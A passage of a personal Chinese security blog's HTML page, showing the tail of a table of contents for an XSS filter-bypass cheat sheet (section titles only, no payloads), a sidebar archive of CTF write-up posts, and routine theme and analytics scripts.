</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用具有style属性的匿名的HTML标签进行XSS"><span class="toc-number">53.</span> <span class="toc-text">利用具有style属性的匿名的HTML标签进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用本地HTC文件进行XSS"><span class="toc-number">54.</span> <span class="toc-text">利用本地HTC文件进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#US-ASCII编码"><span class="toc-number">55.</span> <span class="toc-text">US-ASCII编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用-lt-META-gt-标签进行XSS"><span class="toc-number">56.</span> <span class="toc-text">利用&lt; META &gt;标签进行XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用标签的content属性进行XSS"><span class="toc-number">56.1.</span> <span class="toc-text">利用标签的content属性进行XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用标签的带URL参数进行XSS绕过"><span class="toc-number">56.2.</span> <span class="toc-text">利用标签的带URL参数进行XSS绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签进行XSS-3"><span class="toc-number">57.</span> <span class="toc-text">利用标签进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用事件触发标签的XSS"><span class="toc-number">58.</span> <span class="toc-text">利用事件触发标签的XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用进行XSS"><span class="toc-number">59.</span> <span class="toc-text">利用进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签进行XSS-4"><span class="toc-number">60.</span> <span class="toc-text">利用标签进行XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用标签进行XSS-5"><span class="toc-number">60.1.</span> <span class="toc-text">利用标签进行XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签"><span class="toc-number">61.</span> <span class="toc-text">利用标签</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在DIV中使用background-image属性完成XSS"><span class="toc-number">61.1.</span> <span class="toc-text">在DIV中使用background-image属性完成XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用background-image属性配合unicoded编码完成XSS"><span class="toc-number">61.2.</span> <span class="toc-text">使用background-image属性配合unicoded编码完成XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用background-image属性加上额外字符完成XSS"><span class="toc-number">61.3.</span> <span class="toc-text">使用background-image属性加上额外字符完成XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用DIV表达式完成XSS"><span class="toc-number">61.4.</span> <span class="toc-text">利用DIV表达式完成XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用IE注释块进行XSS绕过"><span class="toc-number">62.</span> <span class="toc-text">利用IE注释块进行XSS绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签进行XSS-6"><span class="toc-number">63.</span> <span class="toc-text">利用标签进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签进行XSS-7"><span class="toc-number">64.</span> <span class="toc-text">利用标签进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用标签嵌入一个包含XSS的Flash动画"><span class="toc-number">65.</span> <span class="toc-text">使用标签嵌入一个包含XSS的Flash动画</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#你可以嵌入包含XSS-payload的SVG"><span class="toc-number">66.</span> <span class="toc-text">你可以嵌入包含XSS payload的SVG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用ActionScript来混淆你的XSS-payload"><span class="toc-number">67.</span> <span class="toc-text">使用ActionScript来混淆你的XSS payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用XML数据与CDATA区段混淆进行XSS"><span class="toc-number">68.</span> <span class="toc-text">利用XML数据与CDATA区段混淆进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用XML的embedded方法在本地XML中嵌入Javascript"><span class="toc-number">69.</span> <span class="toc-text">利用XML的embedded方法在本地XML中嵌入Javascript</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用XML中加入HTML-Time元素完成XSS"><span class="toc-number">70.</span> <span class="toc-text">利用XML中加入HTML+Time元素完成XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过简单修改字符去绕过过滤器对”-js”的过滤"><span class="toc-number">71.</span> <span class="toc-text">通过简单修改字符去绕过过滤器对”.js”的过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSI-服务端包含-进行XSS"><span class="toc-number">72.</span> <span class="toc-text">SSI(服务端包含)进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用PHP完成XSS"><span class="toc-number">73.</span> <span class="toc-text">利用PHP完成XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用IMG标签嵌入命令执行XSS"><span class="toc-number">74.</span> <span class="toc-text">利用IMG标签嵌入命令执行XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用IMG标签嵌入命令执行XSS-part-II"><span class="toc-number">74.1.</span> <span class="toc-text">利用IMG标签嵌入命令执行XSS part II</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie篡改"><span class="toc-number">75.</span> <span class="toc-text">Cookie篡改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用UTF-7编码进行XSS"><span class="toc-number">76.</span> <span class="toc-text">利用UTF-7编码进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用HTML引用封装进行XSS"><span class="toc-number">77.</span> <span class="toc-text">使用HTML引用封装进行XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一个令人担忧的XSS-payload"><span class="toc-number">77.1.</span> <span class="toc-text">一个令人担忧的XSS payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL字符串绕过"><span class="toc-number">78.</span> <span class="toc-text">URL字符串绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用IP代替域名"><span class="toc-number">78.1.</span> <span class="toc-text">利用IP代替域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用URL编码"><span class="toc-number">78.2.</span> <span class="toc-text">利用URL编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用双字节编码"><span class="toc-number">78.3.</span> <span class="toc-text">利用双字节编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用十六进制编码"><span class="toc-number">78.4.</span> <span class="toc-text">利用十六进制编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用八进制编码"><span class="toc-number">78.5.</span> <span class="toc-text">利用八进制编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用混合编码"><span class="toc-number">78.6.</span> <span class="toc-text">利用混合编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用协议解析绕过"><span class="toc-number">78.7.</span> <span class="toc-text">利用协议解析绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用Google”手气不错”-part-1"><span class="toc-number">78.8.</span> <span class="toc-text">利用Google”手气不错” part 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用Google”手气不错”-part-2"><span class="toc-number">78.9.</span> <span class="toc-text">利用Google”手气不错” part 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用Google”手气不错”-part-3"><span class="toc-number">78.10.</span> <span class="toc-text">利用Google”手气不错” part 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用删除cnames"><span class="toc-number">78.11.</span> <span class="toc-text">利用删除cnames</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用额外点绕过"><span class="toc-number">78.12.</span> <span class="toc-text">利用额外点绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用Javascript链接地址"><span class="toc-number">78.13.</span> <span class="toc-text">利用Javascript链接地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用内容替换的payload"><span class="toc-number">78.14.</span> <span class="toc-text">利用内容替换的payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#字符转义表"><span class="toc-number">79.</span> <span class="toc-text">字符转义表</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#针对跨站脚本攻击-绕过WAF的方法"><span class="toc-number"></span> <span class="toc-text">针对跨站脚本攻击-绕过WAF的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS请求重定向"><span class="toc-number">1.</span> <span class="toc-text">XSS请求重定向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#针对XSS-bypass-WAF的字符串"><span class="toc-number">2.</span> <span class="toc-text">针对XSS bypass WAF的字符串</span></a></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 16
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2019 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2019/03/04/xss-bypass-备忘录/">xss bypass 备忘录</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQLMAP-tamper列表/">sqlmap tamper 列表</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/26</span><a class="archive-post-title" href="/2019/02/26/Jarvis-OJ-inject/">Jarvis OJ inject</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/25</span><a class="archive-post-title" href="/2019/02/25/Jarvis-OJ-phpinfo/">Jarvis OJ phpinfo</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019 fireshell-web-Vice/">2019 fireshell web Vice</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-web/">安恒杯 一月 web</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars【树状数组】/">POJ-2352 Stars【树状数组】</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2018 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/NJCTF-guess/">2017 NJCTF web guess</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/08</span><a class="archive-post-title" href="/2018/12/08/Please-don't-stop-rua-233333/">Please don't stop rua 233333</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/08</span><a class="archive-post-title" href="/2018/12/08/爬取电影天堂全站电影/">爬取电影天堂电影</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/26</span><a class="archive-post-title" href="/2018/11/26/爬取京东商品信息/">爬取京东商品信息</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/26</span><a class="archive-post-title" href="/2018/10/26/Raccoon_Writeup/">Raccoon web Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/2018/09/26/bugku-Web-部分WP/">bugku Web 部分WP</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/26</span><a class="archive-post-title" href="/2018/02/26/葵花宝典/">葵花宝典</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/26</span><a class="archive-post-title" href="/2018/01/26/Web安全笔记/">Web 安全笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/25</span><a class="archive-post-title" href="/2018/01/25/hello-world/">Hello World</a>
        </li>
    
    </ul></div>
  </div>
        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
    
        <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
    
        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
    
        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
    
        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
    
        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
    
        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
    
        <span class="sidebar-tag-name" data-tags="爬虫"><span class="iconfont-archer">&#xe606;</span>爬虫</span>
    
        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
    
        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
    
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
    缺失模块。<br>
    1、请确保node版本大于6.2<br>
    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
    3、在根目录_config.yml里添加配置：
    <pre style="color: #787878; font-size: 0.6rem;">
jsonContent:
  meta: false
  pages: false
  posts:
    title: true
    date: true
    path: true
    text: false
    raw: false
    content: false
    slug: false
    updated: false
    comments: false
    link: false
    permalink: false
    excerpt: false
    categories: true
    tags: true</pre>
    </div> 
    <div class="sidebar-tags-list"></div>
</div>
        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>
    </div>
</div> 
    <script>
    var siteMeta = {
        root: "/",
        author: "wywwzjj"
    }
</script>
    <!-- CDN failover -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ === 'undefined')
        {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
        }
    </script>
    <script src="/scripts/main.js"></script>
    <!-- algolia -->
    
    <!-- busuanzi  -->
    
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
    <!-- CNZZ  -->
    
    </div>
    <!-- async load share.js -->
    
        <script src="/scripts/share.js" async></script>    
     
    </body>
</html>


